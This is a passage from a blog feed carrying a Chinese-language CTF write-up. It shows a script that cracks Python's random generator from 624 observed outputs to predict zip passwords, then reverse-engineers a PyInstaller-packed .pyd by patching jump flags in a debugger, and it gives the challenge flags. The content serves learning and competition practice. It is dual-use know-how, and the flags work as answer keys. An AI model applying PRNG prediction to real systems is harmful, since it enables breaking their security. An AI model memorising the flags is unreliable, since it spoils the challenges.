class="number">2930015733</span>,<span class="number">3697241657</span>,<span class="number">570349524</span>,<span class="number">1000281623</span>,<span class="number">2960131310</span>,<span class="number">3941057032</span>,<span class="number">3611068081</span>,<span class="number">1929535695</span>,<span class="number">1078174814</span>,<span class="number">549556557</span>,<span class="number">2427930182</span>,<span class="number">1127864687</span>,<span class="number">3728874623</span>,<span class="number">1552852683</span>,<span class="number">246530969</span>,<span class="number">3129577778</span>,<span class="number">2828503428</span>,<span class="number">741919312</span>,<span class="number">215642980</span>,<span class="number">1167747156</span>,<span class="number">1074184265</span>,<span class="number">1803181867</span>,<span class="number">1728287989</span>,<span class="number">3994497806</span>,<span class="number">3166040995</span>,<span class="number">4102870506</span>,<span class="number">2533028438</span>,<span class="number">1554448227</span>,<span class="number">1743174913</span>,<span class="number">2757654175</span>,<span class="number">1620162669</span>,<span class="number">2326525927</span>,<span class="number">1822891531</span>,<span class="number">3118838616</span>,<span class="number">988494514</span>,<span class="number">724274952</span>,<span class="number">3466926668</span>,<span class="number">2858066332</span>,<span class="number">1508595710</span>,<span class="number">2951666140</span>,<span class="number">1637995296</span>,<span class="number">2345022808</span>,<span class="number">4293996946</span>,<span class="number">2531108812</span>,<span class="number">1393641667</span>,<span class="number">3609374661</span>,<span class="number">1294467284</span>,<span class="number">1466747081</span>,<span class="number">1787125071</span>,<span class="number">418589219</span>,<span class="number">2105433503</span>,<span class="number">2486534005</span>,<span class="number">1556969350</span>,<span class="number">4187693157</span>,<span class="number">2376356641</span>,<span class="number">2760842106</span>,<span class="number">3305118691</span>,<span class="number">2311132184</span>,<span class="number">2756948087</span>,<span class="number">3686050208</span>,<span class="number">1794448609</span>,<span class="number">2080775564</span>,<span class="number">2924248445</span>,<span class="number">2178418677</span>,<span class="number">4158669833</span>,<span class="number">3219430073</span>,<span class="number">967669386</span>,<span class="number">221829347</span>,<span class="number">730413000</span>,<span class="number">4032488141</span>,<span class="number">861524009</span>,<span class="number">3520395384</span>,<span class="number">229287210</span>,<span class="number">2928013323</span>,<span class="number">634603946</span>,<span class="number">2344109932</span>,<span class="number">2651517581</span>,<span class="number">2956026520</span>,<span class="number">3962896689</span>,<span class="number">752853056</span>,<span class="number">1576906191</span>,<span class="number">420644394</span>,<span class="number">1259665633</span>,<span class="number">1833948237</span>,<span class="number">1550770827</span>,<span class="number">2065923435</span>,<span class="number">4174111849</span>,<span class="number">3128201235</span>,<span class="number">2682226239</span>,<span class="number">3167161894</span>,<span class="number">576977612</span>,<span class="number">2487367426</span>,<span class="number">2431206872</span>,<span class="number">3390561516</span>,<span class="number">2334384070</span>,<span class="number">3436416734</span>,<span class="number">2200879126</span>,<span class="number">3180692685</span>,<span class="number">2766121590</span>,<span class="number">1064218408</span>,<span class="number">410199199</span>,<span class="number">20022323</span>,<span class="number">1718513066</span>,<span class="number">3297953226</span>,<span class="number">451443686</span>,<span class="number">2132362103</span>,<span class="number">257410781</span>,<span class="number">1541671484</span>,<span class="number">3761895270</span>,<span class="number">348365872</span>,<span class="number">816022713</span>,<span class="number">4294497492</span>,<span class="number">2625738817</span>,<span class="number">3603223866</span>,<span class="number">3078033498</span>,<span class="number">1147648777</span>,<span class="number">3514932557</span>,<span class="number">2930781580</span>,<span class="number">984846570</span>,<span class="number">4212244974</span>,<span class="number">1020179629</span>,<span class="number">3382552365</span>,<span class="number">3588342390</span>,<span class="number">2485187463</span>,<span class="number">2828961807</span>,<span class="number">4136474278</span>,<span class="number">3551225472</span>,<span class="number">4086885006</span>,<span class="number">1310692642</span>,<span class="number">2241965503</span>,<span class="number">1504390196</span>,<span class="number">1603497325</span>,<span class="number">1455103646</span>,<span class="number">366434701</span>,<span class="number">293869916</span>,<span class="number">1550592307</span>,<span class="number">4214651425</span>,<span class="number">4250886934</span>,<span class="number">1306227123</span>,<span class="number">4036718626</span>,<span class="number">2933260006</span>,<span class="number">762182112</span>,<span class="number">1830993485</span>,<span class="number">2128141366</span>,<span class="number">44628368</span>,<span class="number">2873401036</span>,<span class="number">1257136753</span>,<span class="number">3380864990</span>,<span class="number">4275919402</span>,<span class="number">789867953</span>,<span class="number">3318150127</span>,<span class="number">487054724</span>,<span class="number">3730547753</span>,<span class="number">1936887664</span>,<span class="number">171225030</span>,<span class="number">3722592745</span>,<span class="number">1340948219</span>,<span class="number">1016521820</span>,<span class="number">1447577763</span>,<span class="number">2805353516</span>,<span class="number">1417994373</span>,<span class="number">817439704</span>,<span class="number">3813079978</span>,<span class="number">1200757040</span>,<span class="number">339005780</span>,<span class="number">4232371651</span>,<span class="number">1296406800</span>,<span class="number">805088113</span>,<span class="number">2812427961</span>,<span class="number">3875582523</span>,<span class="number">4113860721</span>,<span class="number">1947280914</span>,<span class="number">3775671015</span>,<span class="number">955163233</span>,<span class="number">3603928099</span>,<span class="number">91477649</span>,<span class="number">3287607536</span>,<span class="number">4201104916</span>,<span class="number">2491411596</span>,<span class="number">460805757</span>,<span class="number">1332051516</span>,<span class="number">3368474042</span>,<span class="number">3164283116</span>,<span class="number">2874896056</span>,<span class="number">293562372</span>,<span class="number">411629539</span>,<span class="number">2220832875</span>,<span class="number">2299167075</span>,<span class="number">2579299726</span>,<span class="number">2882735860</span>,<span class="number">2668845063</span>,<span class="number">42813252</span>,<span class="number">917639463</span>,<span class="number">2216449232</span>,<span class="number">2644803904</span>,<span class="number">2031826548</span>,<span class="number">3452099002</span>,<span class="number">1103665712</span>,<span class="number">1070395870</span>,<span class="number">532734790</span>,<span class="number">4097725963</span>,<span class="number">581033399</span>,<span class="number">963298035</span>,<span class="number">823792656</span>,<span class="number">3525861586</span>,<span class="number">20973404</span>,<span class="number">2359012004</span>,<span class="number">3432019008</span>,<span class="number">2233316197</span>,<span class="number">697890212</span>,<span class="number">3568807990</span>,<span class="number">3652343610</span>,<span class="number">1398136840</span>,<span class="number">937985297</span>,<span class="number">2581792527</span>,<span class="number">2566945713</span>,<span class="number">1386694986</span>,<span class="number">2557383413</span>,<span class="number">1945328836</span>,<span class="number">1021712351</span>,<span class="number">3289407095</span>,<span class="number">2323689998</span>,<span class="number">3306271310</span>,<span class="number">3585440682</span>,<span class="number">1855892766</span>,<span class="number">2796595085</span>,<span class="number">2504479613</span>,<span class="number">1289850575</span>,<span class="number">2929745242</span>,<span class="number">2021810381</span>,<span class="number">3242210155</span>,<span class="number">3055960700</span>,<span class="number">365068549</span>,<span class="number">2513400611</span>,<span class="number">553638319</span>,<span class="number">3920510223</span>,<span class="number">2495696848</span>,<span class="number">1824819128</span>,<span class="number">1213008255</span>,<span class="number">4189990551</span>,<span class="number">1989970719</span>,<span class="number">1031033434</span>,<span class="number">531275736</span>,<span class="number">882122649</span>,<span class="number">1721700980</span>,<span class="number">3178163802</span>,<span class="number">3700771996</span>,<span class="number">1850869451</span>,<span class="number">3206165832</span>,<span class="number">1272158460</span>,<span class="number">3303927391</span>,<span class="number">4119824836</span>,<span class="number">3968831781</span>,<span class="number">3771252104</span>,<span class="number">1674478394</span>,<span class="number">530327252</span>,<span class="number">9184370</span>,<span class="number">2681387057</span>,<span class="number">1178553319</span>,<span class="number">1950066334</span>,<span class="number">3127696976</span>,<span class="number">2661749414</span>,<span class="number">1383174577</span>,<span class="number">4201508029</span>]</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">while True:</span><br><span class="line">    password = randcrack(nums[-<span class="number">624</span>:])</span><br><span class="line">    print(&quot;password:&#123;&#125;&quot;.format(password))</span><br><span class="line">    nums.append(int(password))</span><br><span class="line">    os.rename(&quot;unknown.zip&quot;,str(password)+&quot;.zip&quot;)</span><br><span class="line">    name = getname()</span><br><span class="line">    if name:</span><br><span class="line">        print(&quot;name &#123;&#125;&quot;.format(name))</span><br><span class="line">        zip_file = zipfile.ZipFile(name)</span><br><span class="line">        zip_list = zip_file.namelist()</span><br><span class="line">        for f in zip_list:</span><br><span class="line">            zip_file.extract(f, r&#x27;./&#x27;, pwd=str(password).encode(&quot;utf-<span class="number">8</span>&quot;))  </span><br><span class="line">        zip_file.close()</span><br><span class="line">        os.remove(name)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(&quot;count = &quot;,count,&quot;name = &quot;,name)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;end or something wrong&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">#flag&#123;R@nd0m_Not_5ec&#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-goodpy"><a href="#0x05-goodpy" class="headerlink" title="0x05 goodpy"></a>0x05 goodpy</h2><p>pyinstaller打包的exe首先 pyinstxtractor.py，网上很容易找，解包后看到一堆文件。本来猜测主程序是pyc,pyo可以反编译，但是不是。只有一些pyd长得像主程序。</p><p>看到叶子姐的wp首先把pyc python magic的12字节写成了16字节（python3.8+???)才去uncomplie6？？？这里没太明白是因为什么的版本问题不太一样？我直接就解出来了，环境python3.7.</p><p>uncompile6会显示可能的entry,有个test.pyc，去看看：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: test.py</span></span><br><span class="line"><span class="keyword">import</span> goodpy</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(goodpy.pypypy())</span><br><span class="line"><span class="comment"># okay decompiling test.pyc</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主程序是 goodpy.cp37-win_amd64.pyd ，可以grep -Rn pypypy 找，只有他了。</p><p>进入之后搜索字符串，可以看到try again等判断字符串，交叉引用来到来到.data段,可以看到很多字符串信息：</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630027084667.png" alt="1630027084667"></p><p>并且都以</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00000001800098A8</span>                 dq offset aGoodgoodgoodgo ; <span class="string">&quot;goodgoodgoodgoodgoodgoodgoodgoodgood!!&quot;</span></span><br><span class="line">.data:<span class="number">00000001800098B0</span>                 dq 27h</span><br><span class="line">.data:<span class="number">00000001800098B8</span>                 dq <span class="number">0</span></span><br><span class="line">.data:<span class="number">00000001800098C0</span>                 dq 100h</span><br><span class="line">.data:<span class="number">00000001800098C8</span>                 dq offset qword_18000A808</span><br></pre></td></tr></table></figure><p>这样的结构体出现，可能和python变量存储为对有相关。</p><p>然后可以找到调用的pypypy函数，sub_180006600</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630028032294.png" alt="1630028032294"></p><p>这也是很多字符串对象结构体中唯一一个有sub函数指向的，下面这个qword_180009740就是Py初始化函数用的。</p><p>jmp来到6600，jmp180005A10，发现一个地方获取了这个对象东西的size大小，并且还有个38的判断，很可能和输入长度有关。</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630029023087.png" alt="1630029023087"></p><p>再看v34，是一个函数在call之后的结果，两个参数未知数据，需要动调。</p><p>运行goodpy.exe，x64dbg attach之后，全部字符串搜索38，找到cmp rax,0x26的地方下断点。（重新运行就断不住了，我还是关了重新attach）</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630031296719.png" alt="1630031296719"></p><p>判断成功后直接走到如下图地方：加载goodgood字符串。</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630116416278.png" alt="1630116416278"></p><p>走完下面3A00函数后如下所示寄存器：</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630116506657.png" alt="1630116506657"></p><p>进入0x26次循环、</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630033088507.png" alt="1630033088507"></p><p>这中间有很多判断和数据加载过程，对应着python各种数据格式。同时也能看到PyObjectXor和PyObject_RichComapre函数使用。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PyObject* PyNumber_Xor(PyObject *o1, PyObject *o2)</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">value</span>: <span class="built_in">New</span> reference.</span><br><span class="line"><span class="keyword">Returns</span> the “bitwise <span class="keyword">exclusive</span> <span class="keyword">or</span>” <span class="keyword">of</span> o1 <span class="keyword">by</span> o2 <span class="keyword">on</span> success, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">on</span> failure. This <span class="keyword">is</span> the equivalent <span class="keyword">of</span> the Python expression o1 ^ o2.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PyObject* PyObject_RichCompare(PyObject *o1, PyObject *o2, <span class="type">int</span> opid)</span><br><span class="line"><span class="keyword">Return</span> <span class="keyword">value</span>: <span class="built_in">New</span> reference.</span><br><span class="line">Compare the <span class="keyword">values</span> <span class="keyword">of</span> o1 <span class="keyword">and</span> o2 <span class="keyword">using</span> the operation specified <span class="keyword">by</span> opid, which must be one <span class="keyword">of</span> Py_LT, Py_LE, Py_EQ, Py_NE, Py_GT, <span class="keyword">or</span> Py_GE, corresponding <span class="keyword">to</span> &lt;, &lt;=, ==, !=, &gt;, <span class="keyword">or</span> &gt;= respectively. This <span class="keyword">is</span> the equivalent <span class="keyword">of</span> the Python expression o1 op o2, <span class="keyword">where</span> op <span class="keyword">is</span> the <span class="keyword">operator</span> corresponding <span class="keyword">to</span> opid. <span class="keyword">Returns</span> the <span class="keyword">value</span> <span class="keyword">of</span> the comparison <span class="keyword">on</span> success, <span class="keyword">or</span> <span class="keyword">NULL</span> <span class="keyword">on</span> failure.</span><br></pre></td></tr></table></figure><p>下断点在xor,formlong,cmp处看一下数据，过程中发现</p><p>走到xor函数时的参数中，RDI的pyobject结构体第4个数据是用来异或的，RSI是good字符串循环加载，异或结果与输入比较，对了就接着往下走。或者直接走到cmp函数那里，如下图所示，每次改一下RDI寄存器（自己输入），重复多次即可,这里发现直接改rdi后者rsi的pyobject地址是无法改变判断跳转的，会出错，找到每次正确的判断控制流为：</p><p>6186不跳</p><p>6190跳</p><p>61a3跳</p><p>61dd跳</p><p>61ee不跳</p><p>61f8跳</p><p>以上都一样。6207大跳,需要设置断点改一下标志位ZF，输入错误时。</p><p>62e8控制0x26循环不会跳的</p><p>62f9跳回</p><p>改一下判断位保证后续。</p><p><img src="C:\Users\L3m0nade\AppData\Roaming\Typora\typora-user-images\1630117534281.png" alt="1630117534281"></p><p>最终结果：</p><p>flag{09d11443a4304a6881718c7023d226de}</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2021HWS-By-L3m0nade&quot;&gt;&lt;a href=&quot;#2021HWS-By-L3m0nade&quot; class=&quot;headerlink&quot; title=&quot;2021HWS By L3m0nade&quot;&gt;&lt;/a&gt;2021HWS By L3m0nade&lt;/h1&gt;&lt;h2 id=&quot;0x00-aet-reverse&quot;&gt;&lt;a href=&quot;#0x00-aet-reverse&quot; class=&quot;headerlink&quot; title=&quot;0x00 aet-reverse&quot;&gt;&lt;/a&gt;0x00 aet-reverse&lt;/h2&gt;&lt;p&gt;​        程序名是xtea但其实是tea,找到源python脚本调一下看一下数据大小端后就行了。看了flag原来真的想骗我分辨xtea,tea…&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.l3m0nade.xyz/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://blog.l3m0nade.xyz/tags/CTF/"/>
    
  </entry>
  
</feed>
